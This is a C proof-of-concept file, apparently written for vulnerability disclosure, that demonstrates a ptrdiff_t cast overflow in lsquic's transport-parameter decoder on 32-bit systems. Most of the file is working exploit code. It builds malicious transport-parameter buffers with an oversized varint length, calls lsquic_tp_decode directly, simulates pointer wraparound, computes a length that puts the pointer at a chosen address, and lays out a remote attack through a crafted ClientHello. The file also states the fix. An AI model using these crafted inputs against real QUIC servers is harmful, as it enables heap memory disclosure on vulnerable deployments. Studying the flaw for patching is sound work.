/* 
 * author: youngseaz
 * email: youngseazcn@gmail.com
 * 
 * POC: lsquic_trans_params ptrdiff_t overflow bypass
 *
 * Vulnerability: In lsquic_tp_decode() and lsquic_tp_decode_27(), the check:
 *   if ((ptrdiff_t) len > end - p)
 *       return -1;
 * can be bypassed on 32-bit systems when len > PTRDIFF_MAX (2^31-1).
 * When len is cast to ptrdiff_t on 32-bit, values > PTRDIFF_MAX become
 * negative, and a negative value is always <= (end - p) (positive),
 * so the check passes incorrectly.
 *
 * This allows an attacker to:
 * 1. Set len to a value > PTRDIFF_MAX via 8-byte varint encoding
 * 2. Bypass the bounds check
 * 3. For unknown TPI (default case), p += len causes pointer wrap
 * 4. Continue parsing from wrapped pointer position (OOB read)
 *
 * Attack path: QUIC transport parameters are carried in the
 * quic_transport_parameters TLS extension, which is embedded in
 * ClientHello (client→server) or EncryptedExtensions (server→client).
 * An attacker fully controls the extension content. The TLS extension
 * length field is uint16 (max 65535), but the varint-encoded len
 * inside the TP can claim any value up to VINT_MAX_VALUE ≈ 4.6×10^18.
 *
 * This POC directly calls lsquic_tp_decode() with crafted buffers
 * to demonstrate the vulnerability on both 32-bit and 64-bit systems.
 *
 * Build (64-bit test):
 *   gcc -I include -I src/liblsquic -I src/lshpack \
 *       -DHAVE_BORINGSSL -g -fsanitize=address \
 *       -o tests/poc_trans_params_ptrdiff tests/poc_trans_params_ptrdiff.c \
 *       src/liblsquic/liblsquic.a \
 *       /path/to/boringssl/libssl.a /path/to/boringssl/libcrypto.a \
 *       -lstdc++ -lz -lm
 *
 * Build (32-bit test - requires 32-bit libs):
 *   gcc -m32 -I include -I src/liblsquic -I src/lshpack \
 *       -DHAVE_BORINGSSL -g -fsanitize=address \
 *       -o tests/poc_trans_params_ptrdiff32 tests/poc_trans_params_ptrdiff.c \
 *       src/liblsquic/liblsquic.a \
 *       /path/to/boringssl/libssl.a /path/to/boringssl/libcrypto.a \
 *       -lstdc++ -lz -lm
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <inttypes.h>

#include "lsquic_types.h"
#include "lsquic_sizes.h"
#include "lsquic_trans_params.h"
#include "lsquic_varint.h"

/* --- Helper: Encode a QUIC varint into buffer --- */
static size_t
encode_varint(uint8_t *buf, uint64_t val)
{
    uint64_t bits = vint_val2bits(val);
    size_t len = 1u << bits;
    uint64_t prefix_mask = (1ull << (6 + 2 * bits)) - 1;
    uint64_t encoded = (bits << vint_bits2shift(bits)) | (val & prefix_mask);

    /* Write in big-endian order */
    if (len == 1)
    {
        buf[0] = (uint8_t) encoded;
    }
    else if (len == 2)
    {
        buf[0] = (uint8_t)(encoded >> 8);
        buf[1] = (uint8_t)(encoded);
    }
    else if (len == 4)
    {
        buf[0] = (uint8_t)(encoded >> 24);
        buf[1] = (uint8_t)(encoded >> 16);
        buf[2] = (uint8_t)(encoded >> 8);
        buf[3] = (uint8_t)(encoded);
    }
    else if (len == 8)
    {
        buf[0] = (uint8_t)(encoded >> 56);
        buf[1] = (uint8_t)(encoded >> 48);
        buf[2] = (uint8_t)(encoded >> 40);
        buf[3] = (uint8_t)(encoded >> 32);
        buf[4] = (uint8_t)(encoded >> 24);
        buf[5] = (uint8_t)(encoded >> 16);
        buf[6] = (uint8_t)(encoded >> 8);
        buf[7] = (uint8_t)(encoded);
    }
    return len;
}

/* --- Test 1: Demonstrate ptrdiff_t overflow on 32-bit --- */
static void
test_ptrdiff_overflow_bypass(void)
{
    printf("\n=== Test 1: ptrdiff_t overflow bypass ===\n");

    uint64_t large_len = 0x80000000ULL;  /* 2^31 = PTRDIFF_MAX + 1 */

    printf("Target len value: 0x%" PRIx64 " (%" PRIu64 ")\n", large_len, large_len);
    printf("PTRDIFF_MAX on this platform: 0x%" PRIx64 "\n", (uint64_t) PTRDIFF_MAX);

    /* Simulate the vulnerable check */
    uint8_t small_buf[64];
    const uint8_t *p = small_buf + 10;  /* Some offset into buffer */
    const uint8_t *end = small_buf + 30; /* 20 bytes remaining */

    ptrdiff_t remaining = end - p;
    printf("Remaining buffer bytes (end - p): %td\n", remaining);

    /* The vulnerable check: */
    int vulnerable_check_result = ((ptrdiff_t) large_len > remaining);
    printf("Vulnerable check: (ptrdiff_t)0x%" PRIx64 " > %td => %s\n",
           large_len, remaining,
           vulnerable_check_result ? "TRUE (blocks)" : "FALSE (BYPASSED!)");

    /* On 32-bit: (ptrdiff_t)0x80000000 = -2147483648 (negative!)
     * -2147483648 > 20 => FALSE => check bypassed!
     * On 64-bit: (ptrdiff_t)0x80000000 = 2147483648 (positive)
     * 2147483648 > 20 => TRUE => check works correctly */

    if ((ptrdiff_t) large_len < 0)
        printf("  ** ON 32-BIT: (ptrdiff_t) cast produces NEGATIVE value => BYPASS **\n");
    else
        printf("  ** ON 64-BIT: (ptrdiff_t) cast is positive => check works **\n");

    /* Correct check would be: */
    int correct_check_result = (large_len > (uint64_t) remaining);
    printf("Correct check: 0x%" PRIx64 " > (uint64_t)%td => %s\n",
           large_len, remaining,
           correct_check_result ? "TRUE (blocks)" : "FALSE (would bypass)");
}

/* --- Test 2: Craft malicious TP buffer with large len for unknown TPI --- */
static void
test_unknown_tpi_large_len(void)
{
    printf("\n=== Test 2: Unknown TPI with large len (direct lsquic_tp_decode call) ===\n");

    /*
     * Craft a transport parameters buffer containing:
     * 1. An unknown TPI (param_id = 0xFFFF, not in tpi_val_2_enum)
     * 2. A len value > PTRDIFF_MAX (0x80000000) encoded as 8-byte varint
     * 3. A few bytes of "content" (the buffer is small, but len claims huge size)
     *
     * On 32-bit: The ptrdiff_t check is bypassed, then:
     *   - tpi = INT_MAX (unknown, from tpi_val_2_enum default case)
     *   - switch(tpi) hits default: break (no content processing)
     *   - p += len => pointer wraps around 32-bit address space
     *   - if wrapped p < end, loop continues reading from OOB memory
     *
     * On 64-bit: The ptrdiff_t check correctly blocks this.
     */

    uint8_t tp_buf[256];
    size_t offset = 0;

    /* Encode param_id = 0xFFFF (unknown TPI, 2-byte varint) */
    offset += encode_varint(tp_buf + offset, 0xFFFF);
    printf("Encoded param_id 0xFFFF at offset 0, size %zu\n", offset);

    /* Encode len = 0x80000000 (8-byte varint, > PTRDIFF_MAX on 32-bit) */
    size_t len_offset = offset;
    offset += encode_varint(tp_buf + offset, 0x80000000ULL);
    printf("Encoded len 0x80000000 at offset %zu, size %zu\n", len_offset, offset - len_offset);

    /* Add a few bytes of "content" for the claimed len */
    /* In reality, the buffer only has a few bytes, but len claims 2GB+ */
    memset(tp_buf + offset, 'A', 4);
    offset += 4;

    printf("Total crafted buffer size: %zu bytes\n", offset);
    printf("Claimed len in varint: 0x80000000 (2,147,483,648 bytes)\n");

    /* Call lsquic_tp_decode with the crafted buffer */
    struct transport_params params;
    printf("\nCalling lsquic_tp_decode(buf, %zu, 1/*server*/, &params)...\n", offset);

    int ret = lsquic_tp_decode(tp_buf, offset, 1, &params);

    if (ret < 0)
    {
        printf("Result: lsquic_tp_decode returned -1 (REJECTED)\n");
        printf("  On 64-bit: ptrdiff_t check correctly blocked the large len\n");
        printf("  On 32-bit: if this returns -1, it may be due to other checks\n");
    }
    else
    {
        printf("Result: lsquic_tp_decode returned %d (ACCEPTED!)\n", ret);
        printf("  ** VULNERABILITY CONFIRMED: large len bypassed bounds check **\n");
        printf("  ** This means OOB read occurred during parsing **\n");
    }
}

/* --- Test 3: Craft TP buffer with len just under PTRDIFF_MAX --- */
static void
test_len_near_ptrdiff_max(void)
{
    printf("\n=== Test 3: len = PTRDIFF_MAX - 1 (edge case) ===\n");

    /*
     * On 32-bit, len = PTRDIFF_MAX - 1 = 0x7FFFFFFE
     * (ptrdiff_t)0x7FFFFFFE = 2147483646 (positive, fits in ptrdiff_t)
     * This value passes the ptrdiff_t check IF remaining buffer >= 2GB
     * But our buffer is tiny, so it should be rejected.
     *
     * However, len = PTRDIFF_MAX + 1 = 0x80000000
     * (ptrdiff_t)0x80000000 = -2147483648 (NEGATIVE on 32-bit!)
     * This bypasses the check regardless of remaining buffer size.
     */

    uint8_t tp_buf[256];
    size_t offset = 0;

    /* Encode unknown TPI */
    offset += encode_varint(tp_buf + offset, 0xFFFF);

    /* Encode len = PTRDIFF_MAX + 1 (the critical bypass value on 32-bit) */
    uint64_t bypass_len = (uint64_t) PTRDIFF_MAX + 1;
    offset += encode_varint(tp_buf + offset, bypass_len);

    /* Add minimal content */
    memset(tp_buf + offset, 'B', 4);
    offset += 4;

    printf("Crafted buffer with len = PTRDIFF_MAX + 1 = 0x%" PRIx64 "\n", bypass_len);

    struct transport_params params;
    int ret = lsquic_tp_decode(tp_buf, offset, 1, &params);

    printf("lsquic_tp_decode result: %d\n", ret);
    if (ret < 0)
        printf("  Rejected (good on 64-bit, but on 32-bit this SHOULD also reject)\n");
    else
        printf("  ** ACCEPTED - ptrdiff_t bypass confirmed on this platform **\n");
}

/* --- Test 4: Multiple unknown TPIs to demonstrate loop continuation --- */
static void
test_multiple_unknown_tpi_loop(void)
{
    printf("\n=== Test 4: Multiple unknown TPIs with moderate len values ===\n");

    /*
     * This test uses len values that are large but still fit in ptrdiff_t
     * on both 32-bit and 64-bit. The goal is to show that unknown TPIs
     * with len > remaining buffer SHOULD be rejected, but on 32-bit
     * with len > PTRDIFF_MAX, they are NOT rejected.
     *
     * We use a small len (100) for the first unknown TPI, which should
     * be rejected because remaining buffer < 100.
     */

    uint8_t tp_buf[64];
    size_t offset = 0;

    /* First unknown TPI with len=100 (should be rejected: buffer too small) */
    offset += encode_varint(tp_buf + offset, 0xFFFF);  /* param_id */
    offset += encode_varint(tp_buf + offset, 100);      /* len = 100 */
    /* Only 4 bytes of content, but len claims 100 */
    memset(tp_buf + offset, 'C', 4);
    offset += 4;

    printf("Buffer size: %zu, claimed len: 100\n", offset);
    printf("Remaining bytes after varint reads: much less than 100\n");

    struct transport_params params;
    int ret = lsquic_tp_decode(tp_buf, offset, 1, &params);

    printf("lsquic_tp_decode result: %d\n", ret);
    if (ret < 0)
        printf("  Correctly rejected: len > remaining buffer\n");
    else
        printf("  ** BUG: Should have been rejected **\n");
}

/* --- Test 5: EXPECT_AT_LEAST macro vulnerability --- */
static void
test_expect_at_least_overflow(void)
{
    printf("\n=== Test 5: EXPECT_AT_LEAST macro pointer arithmetic overflow ===\n");

    /*
     * The EXPECT_AT_LEAST macro:
     *   if ((expected_len) > (uintptr_t) (p + len - q))
     *       return -1;
     *
     * If len is very large (e.g., 0x80000000 on 32-bit), then:
     *   p + len wraps around the 32-bit address space
     *   (uintptr_t)(p + len - q) becomes a small or incorrect value
     *   The check may pass when it shouldn't
     *
     * This is used in TPI_PREFERRED_ADDRESS parsing where q = p,
     * and multiple EXPECT_AT_LEAST calls check sub-fields.
     */

    printf("EXPECT_AT_LEAST macro analysis:\n");
    printf("  Macro: if ((expected_len) > (uintptr_t)(p + len - q)) return -1;\n");
    printf("  If len > address space on 32-bit, p + len wraps around\n");
    printf("  (uintptr_t)(wrapped_ptr - q) gives incorrect small value\n");
    printf("  Check passes when it should fail\n");
    printf("\n");
    printf("  This vulnerability is DEPENDENT on the ptrdiff_t bypass (#2).\n");
    printf("  If the initial (ptrdiff_t)len > end-p check is bypassed,\n");
    printf("  then EXPECT_AT_LEAST can also be bypassed for PREFERRED_ADDRESS.\n");
}

/* --- Test 6: Simulate full attack scenario --- */
static void
test_full_attack_simulation(void)
{
    printf("\n=== Test 6: Full attack simulation ===\n");

    printf("Attack scenario (32-bit lsquic server):\n");
    printf("  1. Attacker (client) connects to lsquic server\n");
    printf("  2. Client sends ClientHello with crafted quic_transport_parameters\n");
    printf("     TLS extension containing:\n");
    printf("     - Unknown TPI (param_id = 0xFFFF)\n");
    printf("     - len = 0x80000000 (8-byte varint, > PTRDIFF_MAX)\n");
    printf("     - Minimal content bytes\n");
    printf("  3. BoringSSL extracts the TLS extension (max 65535 bytes)\n");
    printf("  4. lsquic calls lsquic_tp_decode(buf, bufsz, 0, &params)\n");
    printf("     - bufsz <= 65535 (TLS extension limit)\n");
    printf("     - vint_read returns len = 0x80000000\n");
    printf("     - (ptrdiff_t)0x80000000 = -2147483648 on 32-bit\n");
    printf("     - -2147483648 > (end - p) => FALSE => CHECK BYPASSED\n");
    printf("     - Unknown TPI: default case, no content check\n");
    printf("     - p += 0x80000000 => pointer wraps around\n");
    printf("     - Loop continues from wrapped position => OOB READ\n");
    printf("  5. Impact: Heap buffer over-read, potential info leak\n");
    printf("\n");

    printf("Why unknown TPI is the exploitable path:\n");
    printf("  Known TPIs have secondary length checks:\n");
    printf("    - Numeric: switch(len) {1,2,4,8} rejects large len\n");
    printf("    - CID: len > MAX_CID_LEN (20) rejects large len\n");
    printf("    - STATELESS_RESET_TOKEN: EXPECT_LEN(16) rejects\n");
    printf("    - PREFERRED_ADDRESS: EXPECT_AT_LEAST chain (but also vulnerable)\n");
    printf("  Unknown TPI: default: break; NO secondary check on len\n");
    printf("  => p += len with unchecked large value => pointer wrap\n");
    printf("\n");

    printf("64-bit systems: NOT exploitable\n");
    printf("  ptrdiff_t is 64-bit, (ptrdiff_t)len never overflows\n");
    printf("  len max ≈ 4.6×10^18 < 2^63-1 ≈ 9.2×10^18\n");
}

/* --- Test 7: Simulate 32-bit ptrdiff_t behavior --- */
static void
test_simulate_32bit_ptrdiff(void)
{
    printf("\n=== Test 7: Simulate 32-bit ptrdiff_t behavior ===\n");

    /*
     * On a 32-bit system, ptrdiff_t is a 32-bit signed integer.
     * We simulate this by casting uint64_t values to int32_t.
     *
     * The vulnerable check: if ((ptrdiff_t) len > end - p)
     * On 32-bit: (ptrdiff_t) is int32_t, max = 0x7FFFFFFF = 2,147,483,647
     */

    printf("Simulating 32-bit ptrdiff_t (int32_t) behavior:\n");
    printf("  32-bit PTRDIFF_MAX = 0x7FFFFFFF = %d\n", 0x7FFFFFFF);
    printf("\n");

    /* Test various len values */
    uint64_t test_lens[] = {
        0x7FFFFFFE,   /* PTRDIFF_MAX - 1: just under max, positive cast */
        0x7FFFFFFF,   /* PTRDIFF_MAX: exactly max, positive cast */
        0x80000000,   /* PTRDIFF_MAX + 1: OVERFLOW, becomes negative! */
        0xFFFFFFFF,   /* Max uint32: cast to -1 */
        0x100000000,  /* > uint32: cast truncates to 0 */
        0x3FFFFFFFFFFFFFFF, /* VINT_MAX_VALUE: cast truncates */
    };

    int32_t remaining_32bit = 20;  /* Simulated remaining buffer */

    for (int i = 0; i < (int)(sizeof(test_lens)/sizeof(test_lens[0])); i++)
    {
        uint64_t len = test_lens[i];
        int32_t len_as_ptrdiff = (int32_t) len;  /* Simulate 32-bit cast */

        printf("  len = 0x%" PRIx64 " (%" PRIu64 ")\n", len, len);
        printf("    (int32_t)len = %d (0x%x)\n", len_as_ptrdiff, (unsigned)len_as_ptrdiff);

        /* The vulnerable check on 32-bit: */
        int vulnerable_result = (len_as_ptrdiff > remaining_32bit);
        printf("    Vulnerable check: (int32_t)len > %d => %s\n",
               remaining_32bit,
               vulnerable_result ? "TRUE (blocks)" : "FALSE (BYPASSED!)");

        /* The correct check: */
        int correct_result = (len > (uint64_t) remaining_32bit);
        printf("    Correct check:   len > (uint64_t)%d => %s\n",
               remaining_32bit,
               correct_result ? "TRUE (blocks)" : "FALSE (would bypass)");

        if (!vulnerable_result && correct_result)
            printf("    ** DISCREPANCY: vulnerable check passes, correct check blocks **\n");
        printf("\n");
    }
}

/* --- Test 8: Demonstrate pointer wrap on 32-bit --- */
static void
test_pointer_wrap_32bit(void)
{
    printf("\n=== Test 8: Simulate pointer wrap on 32-bit ===\n");

    /*
     * After the ptrdiff_t check is bypassed, the code does:
     *   p += len;
     * On 32-bit, if len = 0x80000000, p wraps around the address space.
     *
     * We simulate this with uint32_t pointer arithmetic.
     */

    printf("Simulating 32-bit pointer arithmetic:\n");

    /* Simulate: p is at some address, end is 20 bytes ahead */
    uint32_t p_sim = 0x1000;     /* Simulated pointer value */
    uint32_t end_sim = 0x1014;   /* p + 20 */
    uint32_t len = 0x80000000;   /* The bypass value */

    printf("  p (simulated) = 0x%x\n", p_sim);
    printf("  end (simulated) = 0x%x (p + 20)\n", end_sim);
    printf("  len = 0x%x (%u)\n", len, len);

    /* After bypass, code does: p += len */
    uint32_t new_p = p_sim + len;
    printf("  p += len => 0x%x (WRAPPED around 32-bit address space!)\n", new_p);

    /* The while loop check: while (p < end) */
    int loop_continues = (new_p < end_sim);
    printf("  while (p < end): 0x%x < 0x%x => %s\n",
           new_p, end_sim,
           loop_continues ? "TRUE (LOOP CONTINUES! OOB READ)" : "FALSE (loop exits)");

    if (loop_continues)
    {
        printf("  ** The loop continues reading from address 0x%x **\n", new_p);
        printf("  ** This is BEFORE the original buffer start (OOB READ) **\n");
        printf("  ** Attacker can read heap memory before the TP buffer **\n");
    }

    /* Another scenario: len chosen so p wraps to a controlled position */
    printf("\n  Alternative: len chosen so p wraps to specific address:\n");
    /* If attacker wants p to wrap to end_sim - 4 (4 bytes before end),
       they need: p + len = end_sim - 4 (mod 2^32)
       len = (end_sim - 4 - p) mod 2^32 */
    uint32_t target_p = end_sim - 4;
    uint32_t crafted_len = (target_p - p_sim);  /* This would be negative in signed, but huge in unsigned */
    /* Actually: crafted_len = target_p - p_sim + 2^32 (to make it wrap) */
    crafted_len = (uint32_t)((uint64_t)target_p - (uint64_t)p_sim + 0x100000000ULL);
    printf("    Target p after wrap: 0x%x (4 bytes before end)\n", target_p);
    printf("    Crafted len: 0x%x (%u)\n", crafted_len, crafted_len);
    printf("    (int32_t)crafted_len = %d\n", (int32_t)crafted_len);
    printf("    Vulnerable check: (int32_t)%d > 20 => %s\n",
           (int32_t)crafted_len,
           ((int32_t)crafted_len > 20) ? "TRUE (blocks)" : "FALSE (BYPASSED!)");
    uint32_t result_p = p_sim + crafted_len;
    printf("    p += crafted_len => 0x%x (matches target: 0x%x)\n", result_p, target_p);
}

/* --- Main --- */
int
main(int argc, char **argv)
{
    printf("POC: lsquic_trans_params ptrdiff_t overflow bypass\n");
    printf("===================================================\n");
    printf("Platform: %d-bit system\n", (int)(sizeof(void*) * 8));
    printf("ptrdiff_t size: %zu bytes\n", sizeof(ptrdiff_t));
    printf("ptrdiff_t max: 0x%" PRIx64 "\n", (uint64_t) PTRDIFF_MAX);
    printf("uint64_t max:  0x%" PRIx64 "\n", (uint64_t) UINT64_MAX);
    printf("VINT_MAX_VALUE: 0x%" PRIx64 "\n", (uint64_t) VINT_MAX_VALUE);
    printf("\n");

    test_ptrdiff_overflow_bypass();
    test_unknown_tpi_large_len();
    test_len_near_ptrdiff_max();
    test_multiple_unknown_tpi_loop();
    test_expect_at_least_overflow();
    test_full_attack_simulation();
    test_simulate_32bit_ptrdiff();
    test_pointer_wrap_32bit();

    printf("\n=== Summary ===\n");
    if (sizeof(ptrdiff_t) == 4)
    {
        printf("RUNNING ON 32-BIT SYSTEM:\n");
        printf("  ** ptrdiff_t overflow IS exploitable **\n");
        printf("  ** An attacker can bypass bounds checks via large varint len **\n");
        printf("  ** This leads to heap OOB read in transport parameter parsing **\n");
        printf("  Severity: MEDIUM-HIGH\n");
    }
    else
    {
        printf("RUNNING ON 64-BIT SYSTEM:\n");
        printf("  ptrdiff_t overflow is NOT exploitable on this platform\n");
        printf("  (ptrdiff_t is 64-bit, matches practical buffer sizes)\n");
        printf("  However, the code is still BUGGY - it relies on platform\n");
        printf("  behavior rather than correct comparison logic.\n");
        printf("  The fix: change (ptrdiff_t)len > end-p to len > (uint64_t)(end-p)\n");
        printf("  Severity: LOW (code quality issue, not exploitable on 64-bit)\n");
        printf("\n");
        printf("  ** See Test 7 & 8 for 32-bit simulation showing the bypass **\n");
    }

    return 0;
}